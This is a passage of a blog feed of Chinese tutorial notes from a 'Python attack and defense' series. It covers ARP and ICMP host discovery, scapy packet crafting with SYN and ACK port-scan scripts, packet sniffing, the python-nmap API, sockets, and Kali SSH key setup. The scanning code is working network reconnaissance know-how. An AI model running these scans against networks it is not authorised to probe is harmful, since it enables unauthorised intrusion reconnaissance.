title="scapy构造ICMP请求包"></a>scapy构造ICMP请求包</h1><pre class="line-numbers language-none"><code class="language-none">ans,unans&#x3D;sr(IP(dst&#x3D;&quot;192.168.1.1&quot;)&#x2F;ICMP())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="python-nmap模块扫描"><a href="#python-nmap模块扫描" class="headerlink" title="python-nmap模块扫描"></a>python-nmap模块扫描</h1><pre class="line-numbers language-none"><code class="language-none">nm.scan(hosts&#x3D;&quot;192.168.1.2&quot;,arguments&#x3D;&quot;-PE -sn&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主机状态扫描-ARP扫描</title>
      <link href="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP简介"><a href="#ARP简介" class="headerlink" title="ARP简介"></a>ARP简介</h1><p>arp(地址解析协议),主要用在以太网中<br>所有的主机在互联网中通信时使用的是IP地址，而在以太网中通信时使用的是硬件地址（MAC地址）</p><h1 id="以太网的结构"><a href="#以太网的结构" class="headerlink" title="以太网的结构"></a>以太网的结构</h1><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/Ether%E7%BD%91%E7%BB%93%E6%9E%84.png" class=""><h1 id="ARP请求与应答"><a href="#ARP请求与应答" class="headerlink" title="ARP请求与应答"></a>ARP请求与应答</h1><p>当局域网内的一台主机(192.168.1.1)想与另一台主机(192.168.1.2)通信时，由于192.168.1.1这台主机只知道目标主机192.168.1.2的IP地址，不知道192.168.1.2的MAC地址。因此，192.168.1.1就需要使用以太广播包给局域网内的每一台主机发送ARP请求，ARP请求的格式为</p><pre class="line-numbers language-none"><code class="language-none">协议类型：ARP Request(ARP请求)源主机IP地址：192.168.1.1目标主机IP地址：192.168.1.2源主机MAC地址：11:11:11:11:11:11目标主机MAC地址：ff:ff:ff:ff:ff:ff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当局域网中的其他主机在接收到这个ARP请求包之后，它就会把自己的IP地址与ARP请求包中头部的目标主机IP作比较，如果不匹配，就不会做出响应。如果匹配，它就会向发送该ARP请求包的主机发送一个ARP响应数据包，ARP响应的格式为</p><pre class="line-numbers language-none"><code class="language-none">协议类型：ARP Response(ARP响应)源主机IP地址: 192.168.1.2目标主机IP地址：192.168.1.1源主机MAC地址：22:22:22:22:22:22目标主机MAC地址：11:11:11:11:11:11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当主机192.168.1.1收到ARP响应包之后，就会把结果放在ARP缓存表中，ARP缓存表格式为</p><pre class="line-numbers language-none"><code class="language-none">IP地址硬件地址类型192.168.1.2     22:22:22:22:22:22       动态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以后当主机192.168.1.1再需要和192.168.1.2主机通信时，只需要查询这个ARP缓存表，找到192.168.1.2对应的MAC地址，然后把数据包发送到该MAC地址即可</p><h1 id="ARP扫描的使用场景-优点及局限性"><a href="#ARP扫描的使用场景-优点及局限性" class="headerlink" title="ARP扫描的使用场景,优点及局限性"></a>ARP扫描的使用场景,优点及局限性</h1><p>当目标主机与我们处于同一个以太网(局域网)中时，利用ARP对其进行扫描是一个最好的选择<br>ARP扫描方式最快，也最为精准，没有任何的安全措施会阻止这种扫描方式<br>ARP扫描只能扫描同一以太网(局域网)内的主机</p><h1 id="ARP扫描的原理图"><a href="#ARP扫描的原理图" class="headerlink" title="ARP扫描的原理图"></a>ARP扫描的原理图</h1><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/arp%E5%8E%9F%E7%90%86%E5%9B%BE1.png" class=""><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/arp%E5%8E%9F%E7%90%86%E5%9B%BE2.png" class=""><h1 id="scapy构造ARP请求包"><a href="#scapy构造ARP请求包" class="headerlink" title="scapy构造ARP请求包"></a>scapy构造ARP请求包</h1><pre class="line-numbers language-none"><code class="language-none">ans,unans&#x3D;srp(Ether(dst&#x3D;&quot;ff:ff:ff:ff:ff:ff&quot;)&#x2F;ARP(pdst&#x3D;&quot;192.168.1.2&quot;),timeout&#x3D;2)ans.summary(lambda req,res:res.printf(&quot;目标主机IP：%ARP.psrc% 目标主机MAC：%Ether.src%&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="python-nmap模块扫描"><a href="#python-nmap模块扫描" class="headerlink" title="python-nmap模块扫描"></a>python-nmap模块扫描</h1><pre class="line-numbers language-none"><code class="language-none">nm.scan(hosts&#x3D;&quot;192.168.1.2&quot;,arguments&#x3D;&quot;-PR -sn&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ARP扫描抓包"><a href="#ARP扫描抓包" class="headerlink" title="ARP扫描抓包"></a>ARP扫描抓包</h1><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/arp%E6%8A%93%E5%8C%851.png" class=""><p>说明目标主机在线</p><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ARP%E6%89%AB%E6%8F%8F/arp%E6%8A%93%E5%8C%852.png" class=""><p>说明目标主机不在线</p>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python-scapy模块</title>
      <link href="/2021/11/30/python-scapy%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/11/30/python-scapy%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="scapy基本介绍"><a href="#scapy基本介绍" class="headerlink" title="scapy基本介绍"></a>scapy基本介绍</h1><p>在scapy中，每一个协议就是一个类。只需要实例化一个协议类，就可以创建一个该协议的数据包</p><h2 id="scapy的协议类"><a href="#scapy的协议类" class="headerlink" title="scapy的协议类"></a>scapy的协议类</h2><p>Ether(),IP(),TCP(),UDP()</p><h1 id="scapy基本操作"><a href="#scapy基本操作" class="headerlink" title="scapy基本操作"></a>scapy基本操作</h1><h2 id="查看协议类的属性"><a href="#查看协议类的属性" class="headerlink" title="查看协议类的属性"></a>查看协议类的属性</h2><p>ls()</p><pre class="line-numbers language-none"><code class="language-none">ls(Ether())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置协议类的属性"><a href="#设置协议类的属性" class="headerlink" title="设置协议类的属性"></a>设置协议类的属性</h3><pre class="line-numbers language-none"><code class="language-none">IP(src&#x3D;&quot;192.168.1.1&quot;,dst&#x3D;&quot;192.168.1.2&quot;,ttl&#x3D;64) #设置ttl值，ttl值是一个数字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="构造dst属性的值为1个IP地址的IP数据包"><a href="#构造dst属性的值为1个IP地址的IP数据包" class="headerlink" title="构造dst属性的值为1个IP地址的IP数据包"></a>构造dst属性的值为1个IP地址的IP数据包</h2><pre class="line-numbers language-none"><code class="language-none">IP(src&#x3D;&quot;192.168.1.1&quot;,dst&#x3D;&quot;192.168.1.2&quot;)dst的值是一个IP地址生成了1个数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="构造dst属性的值为1个IP范围的IP数据包"><a href="#构造dst属性的值为1个IP范围的IP数据包" class="headerlink" title="构造dst属性的值为1个IP范围的IP数据包"></a>构造dst属性的值为1个IP范围的IP数据包</h2><pre class="line-numbers language-none"><code class="language-none">IP(src&#x3D;&quot;192.168.1.1&quot;,dst&#x3D;&quot;192.168.1.0&#x2F;24&quot;)dst的值是一个IP范围生成了256个数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>要查看其中的每一个数据包</p><pre class="line-numbers language-none"><code class="language-none">[p for p in ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="scapy数据包构造形式"><a href="#scapy数据包构造形式" class="headerlink" title="scapy数据包构造形式"></a>scapy数据包构造形式</h2><p>scapy采用分层的形式来构造数据包，通常最下面的一个协议为Ether,然后是IP，再之后是TCP或UDP</p><h3 id="生成一个广播数据包"><a href="#生成一个广播数据包" class="headerlink" title="生成一个广播数据包"></a>生成一个广播数据包</h3><pre class="line-numbers language-none"><code class="language-none">Ether(dst&#x3D;&quot;ff:ff:ff:ff:ff:ff&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>scapy中的分层通过符号“&#x2F;”实现，一个数据包是由多层协议组合而成，这些协议之间使用“&#x2F;”分开，按照协议由底而上的顺序从左向右排列</p><h3 id="构造一个TCP数据包"><a href="#构造一个TCP数据包" class="headerlink" title="构造一个TCP数据包"></a>构造一个TCP数据包</h3><pre class="line-numbers language-none"><code class="language-none">Ether()&#x2F;IP()&#x2F;TCP()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="构造一个HTTP数据包"><a href="#构造一个HTTP数据包" class="headerlink" title="构造一个HTTP数据包"></a>构造一个HTTP数据包</h3><pre class="line-numbers language-none"><code class="language-none">IP()&#x2F;TCP()&#x2F;&quot;GET &#x2F; HTTP&#x2F;1.0\r\n\r\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="scapy模块中的函数"><a href="#scapy模块中的函数" class="headerlink" title="scapy模块中的函数"></a>scapy模块中的函数</h1><pre class="line-numbers language-none"><code class="language-none">send() #工作在第三层，用来发送IP数据包sendp() #工作在第二层，用来发送Ether数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：send()和sendp()只发不收，只会将数据包发送出去，但不能处理该数据包的回应包</p><pre class="line-numbers language-none"><code class="language-none">fuzz() #构造一个内容是随机填充的数据包，又保证这个数据包的正确性例：IP(dst&#x3D;&quot;192.168.1.1&quot;)&#x2F;fuzz(TCP())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">sr() #工作在第三层，用来发送和接收数据包sr1() #工作在第三层，用来发送和接收数据包srp() #工作在第二层，用来发送和接收数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>sr()的返回值是两个列表，第一个列表是收到了应答的数据包和对应的应答数据包，第二个列表是未收到应答的数据包<br>所以可以使用两个列表来保存sr()的返回值</p><pre class="line-numbers language-none"><code class="language-none">ans,unans&#x3D;sr(IP(dst&#x3D;&quot;192.168.1.1&quot;)&#x2F;ICMP())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看ans,unans列表中数据包的内容</p><pre class="line-numbers language-none"><code class="language-none">ans.summary()unans.summary()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断数据包是否具有某协议</p><pre class="line-numbers language-none"><code class="language-none">haslayer() 例：resp.haslayer(TCP)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>读取数据包中某协议字段的内容</p><pre class="line-numbers language-none"><code class="language-none">getlayer()例：resp.getlayer(TCP).flags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>自动生成一个随机端口号</p><pre class="line-numbers language-none"><code class="language-none">RandShort()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sr1()跟sr()作用基本一样，但是只返回一个应答数据包,所以只需使用一个列表来保存这个函数的返回值</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;sr1(IP(dst&#x3D;&#39;192.168.1.1&#39;)&#x2F;ICMP())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用sr1()来测试目标的某个端口是否开放，采用半开扫描(SYN)方法：</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;sr1(IP(dst&#x3D;&quot;192.168.1.1&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">sniff() #捕获经过本机网卡的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用sniff()开始监听，但是捕获的数据包不会即时显示，只有使用ctrl+c停止监听时才会显示捕获的数据包<br>sniff()可以使用filter参数对数据包进行过滤，例：<br>只捕获与主机192.168.1.1有关的数据包</p><pre class="line-numbers language-none"><code class="language-none">sniff(filter&#x3D;&quot;host 192.168.1.1&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只捕获指定协议的数据包</p><pre class="line-numbers language-none"><code class="language-none">sniff(filter&#x3D;&quot;icmp&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要同时满足多个条件可以使用“and”，”or”等关系运算符来表达</p><pre class="line-numbers language-none"><code class="language-none">sniff(filter&#x3D;&quot;host 192.168.1.1 and icmp&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sniff()可以使用iface参数指定所要进行监听的网卡</p><pre class="line-numbers language-none"><code class="language-none">sniff(iface&#x3D;&quot;eth0&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sniff()可以使用count参数指定监听到数据包的数量，达到指定的数量就会停止监听</p><pre class="line-numbers language-none"><code class="language-none">sniff(count&#x3D;5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sniff()参数组合使用</p><pre class="line-numbers language-none"><code class="language-none">sniff(count&#x3D;3,iface&#x3D;&quot;eth0&quot;,filter&#x3D;&quot;host 192.168.1.1 and icmp&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：在scapy中，“_”下划线符号表示上一条语句执行的结果</p><pre class="line-numbers language-none"><code class="language-none">a.summary() #以摘要的形式显示a的内容，摘要的长度为一行a.nsummary() #作用与summary()相同，只是要操作的对象是多个数据包a.show() #显示数据包的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="scapy模块的常用简单实例"><a href="#scapy模块的常用简单实例" class="headerlink" title="scapy模块的常用简单实例"></a>scapy模块的常用简单实例</h1><p>ACK端口扫描，探测目标端口是否被防火墙等过滤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> IP<span class="token punctuation">,</span>TCP<span class="token punctuation">,</span>srans<span class="token punctuation">,</span>unans<span class="token operator">=</span>sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">,</span><span class="token number">445</span><span class="token punctuation">]</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> request<span class="token punctuation">,</span>response <span class="token keyword">in</span> ans<span class="token punctuation">:</span><span class="token keyword">if</span> request<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport <span class="token operator">==</span> response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" is unfiltered"</span><span class="token punctuation">)</span><span class="token keyword">for</span> req <span class="token keyword">in</span> unans<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>req<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" is filtered"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SYN端口扫描，探测目标端口开放或关闭</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> IP<span class="token punctuation">,</span>TCP<span class="token punctuation">,</span>sr<span class="token punctuation">,</span>fuzzans<span class="token punctuation">,</span>unans<span class="token operator">=</span>sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">)</span><span class="token operator">/</span>fuzz<span class="token punctuation">(</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">]</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> request<span class="token punctuation">,</span>response <span class="token keyword">in</span> ans<span class="token punctuation">:</span><span class="token keyword">if</span> response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" is open"</span><span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" is closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python-python-nmap模块</title>
      <link href="/2021/11/27/python-python-nmap%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/11/27/python-python-nmap%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="python-nmap模块使用前提"><a href="#python-nmap模块使用前提" class="headerlink" title="python-nmap模块使用前提"></a>python-nmap模块使用前提</h1><p>系统必须安装nmap</p><h1 id="python-nmap模块安装"><a href="#python-nmap模块安装" class="headerlink" title="python-nmap模块安装"></a>python-nmap模块安装</h1><pre class="line-numbers language-none"><code class="language-none">pip install python-nmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="python导入python-nmap模块"><a href="#python导入python-nmap模块" class="headerlink" title="python导入python-nmap模块"></a>python导入python-nmap模块</h1><pre class="line-numbers language-none"><code class="language-none">import nmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="python-nmap模块基本用法"><a href="#python-nmap模块基本用法" class="headerlink" title="python-nmap模块基本用法"></a>python-nmap模块基本用法</h1><ul><li>python-nmap模块的核心类<br>PortScanner，PortScannerAsync,PortScannerError,PortScannerHostDict,PortScannerYield<br>其中最为重要的是PortScanner类</li><li>python-nmap模块类的实例化<pre class="line-numbers language-none"><code class="language-none">nm&#x3D;nmap.PortScanner() #PortScanner类的实例化nm&#x3D;nmap.PortScannerAsync() #PortScannerAsync(与PortScanner功能类似，但可以实现异步扫描）实例化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h1 id="python-nmap模块中的函数"><a href="#python-nmap模块中的函数" class="headerlink" title="python-nmap模块中的函数"></a>python-nmap模块中的函数</h1><h2 id="PortScanner类"><a href="#PortScanner类" class="headerlink" title="PortScanner类"></a>PortScanner类</h2><pre class="line-numbers language-none"><code class="language-none">scan(hosts&#x3D;&quot;127.0.0.1&quot;,ports&#x3D;&quot;1-1000&quot;,arguments&#x3D;&quot;-sV&quot;,sudo&#x3D;False)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用来对指定目标进行扫描<br>hosts是要扫描的主机，可以是IP地址，也可以是域名<br>ports是要扫描的端口，单一端口：80 多个端口：80,443,3389 端口范围：1-1000<br>arguments是nmap扫描时所使用的参数<br>默认sudo&#x3D;False,如果扫描需要sudo权限，则需要sudo&#x3D;True</p><pre class="line-numbers language-none"><code class="language-none">all_hosts() #返回一个被扫描的所有主机列表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">command_line() #返回在当前扫描中使用的命令行命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">csv() #返回值是一个csv格式的扫描结果的输出如果看不清楚，可以使用print(nm.csv())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">has_host(&#39;127.0.0.1&#39;) #检查是否有该host的扫描结果，有为True,没有为False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">scaninfo() #列出一个扫描信息的结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个类还支持以下操作</p><pre class="line-numbers language-none"><code class="language-none">nm[&#39;192.168.1.1&#39;].hostname() #获取192.168.1.1的主机名，通常为用户记录nm[&#39;192.168.1.1&#39;].state() #获取主机192.168.1.1的状态nm[&#39;192.168.1.1&#39;].all_protocols() #获取执行的协议nm[&#39;192.168.1.1&#39;][&#39;tcp&#39;].keys() #获取TCP所有的端口号nm[&#39;192.168.1.1&#39;].all_tcp() #获取TCP所有的端口号(按照端口号大小进行排序）nm[&#39;192.168.1.1&#39;].all_udp() #获取UDP所有的端口号(按照端口号大小进行排序)nm[&#39;192.168.1.1&#39;].all_sctp() #获取SCTP所有的端口号(按照端口号大小进行排序)nm[&#39;192.168.1.1&#39;].has_tcp(22) #主机192.168.1.1是否有关于22端口的任何信息nm[&#39;192.168.1.1&#39;][&#39;tcp&#39;][22] #获取主机192.168.1.1关于22端口的信息nm[&#39;192.168.1.1&#39;].tcp(22) #获取主机192.168.1.1关于22端口的信息nm[&#39;192.168.1.1&#39;][&#39;tcp&#39;][22][&#39;state&#39;] #获取主机22端口的状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PortScannerAsync类"><a href="#PortScannerAsync类" class="headerlink" title="PortScannerAsync类"></a>PortScannerAsync类</h2><pre class="line-numbers language-none"><code class="language-none">scan(hosts&#x3D;&quot;127.0.0.1&quot;,ports&#x3D;&quot;80,443&quot;,arguments&#x3D;&quot;-sV&quot;,callback&#x3D;None,sudo&#x3D;False)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相比PortScanner类多了一个回调函数callback,callback参数的值是一个函数,如：callback&#x3D;callback_result,callback_result是函数名，函数是以(host,scan_data)为参数的函数<br>这个类提供了以下三个用来实现异步的函数</p><pre class="line-numbers language-none"><code class="language-none">still_scanning() #如果扫描正在进行，则返回True,否则返回False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">wait(2) #表示等待时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">stop() #停止当前的扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python-socket模块</title>
      <link href="/2021/11/26/python-socket%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/11/26/python-socket%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="socket的实例化"><a href="#socket的实例化" class="headerlink" title="socket的实例化"></a>socket的实例化</h1><pre class="line-numbers language-none"><code class="language-none">socket(family,type[,protocol)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>family：地址族(默认为socket.AF_INET)<br>type:socket类型(默认为socket.SOCK_STREAM,SOCK_STREAM表示TCP，SOCK_DGRAM表示UDP）<br>protocol:使用的协议(该参数可选，默认为0，表示系统自动选择)</p><h2 id="实例化一个TCP类型的socket"><a href="#实例化一个TCP类型的socket" class="headerlink" title="实例化一个TCP类型的socket"></a>实例化一个TCP类型的socket</h2><pre class="line-numbers language-none"><code class="language-none">s&#x3D;socket.socket()或s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="实例化一个UDP类型的socket"><a href="#实例化一个UDP类型的socket" class="headerlink" title="实例化一个UDP类型的socket"></a>实例化一个UDP类型的socket</h2><pre class="line-numbers language-none"><code class="language-none">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="socket常用的函数"><a href="#socket常用的函数" class="headerlink" title="socket常用的函数"></a>socket常用的函数</h1><h2 id="服务端socket函数"><a href="#服务端socket函数" class="headerlink" title="服务端socket函数"></a>服务端socket函数</h2><p>bind() #将创建的socket与指定的IP地址与端口进行绑定，参数是一个元组(host,port),host是字符串，port是数字<br>listen() #在使用TCP的服务端开启监听模式，参数为可以挂起的最大连接数量，一般为5<br>accept() #在使用TCP的服务端接收连接，一般是阻塞态。返回值为conn和address,conn是新的套接字对象，可以用来接收和发送数据。address是连接服务端的客户端的地址</p><h2 id="客户端socket函数"><a href="#客户端socket函数" class="headerlink" title="客户端socket函数"></a>客户端socket函数</h2><p>connect() #使用TCP的客户端去连接服务端，参数是一个元组(host,port),host是字符串，port是数字</p><h2 id="服务端和客户端都可以使用的socket函数"><a href="#服务端和客户端都可以使用的socket函数" class="headerlink" title="服务端和客户端都可以使用的socket函数"></a>服务端和客户端都可以使用的socket函数</h2><p>send() #在使用TCP时发送数据，返回值是发送字节的数量。但可能未将指定的内容全部发送。参数是要发送的数据<br>sendall() #与send()类似，区别是会完整发送TCP数据。发送成功返回None,发送失败则抛出异常<br>recv() #在使用TCP时接收数据，数据以字符串形式返回。参数指定最多可以接收的数量<br>sendto() #在使用UDP时发送数据，返回值是发送的字节数。第一个参数是发送的字符串，第二个参数是address,表示要发送的远程地址，是一个(ip,port)的元组<br>recvfrom() #UDP专用，接收数据。返回值是data和address,data是包含接收数据的字符串，address是发送数据的套接字的地址<br>close() #关闭socket</p>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali ssh连接配置</title>
      <link href="/2021/11/25/kali-ssh%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/11/25/kali-ssh%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="首先打开ssh目录"><a href="#首先打开ssh目录" class="headerlink" title="首先打开ssh目录"></a>首先打开ssh目录</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="以下ssh-host-为ssh默认密钥，我们需要将默认密钥备份，然后创建新的ssh密钥"><a href="#以下ssh-host-为ssh默认密钥，我们需要将默认密钥备份，然后创建新的ssh密钥" class="headerlink" title="以下ssh_host_*为ssh默认密钥，我们需要将默认密钥备份，然后创建新的ssh密钥"></a>以下ssh_host_*为ssh默认密钥，我们需要将默认密钥备份，然后创建新的ssh密钥</h1><p><img src="/ssh-1.png"><br>#备份默认密钥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> keys_backup<span class="token function">mv</span> ssh_host_* keys_backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="在-x2F-etc-x2F-ssh下创建新的ssh密钥"><a href="#在-x2F-etc-x2F-ssh下创建新的ssh密钥" class="headerlink" title="在&#x2F;etc&#x2F;ssh下创建新的ssh密钥"></a>在&#x2F;etc&#x2F;ssh下创建新的ssh密钥</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg-reconfigure openssh-server<span aria-hidden="true" 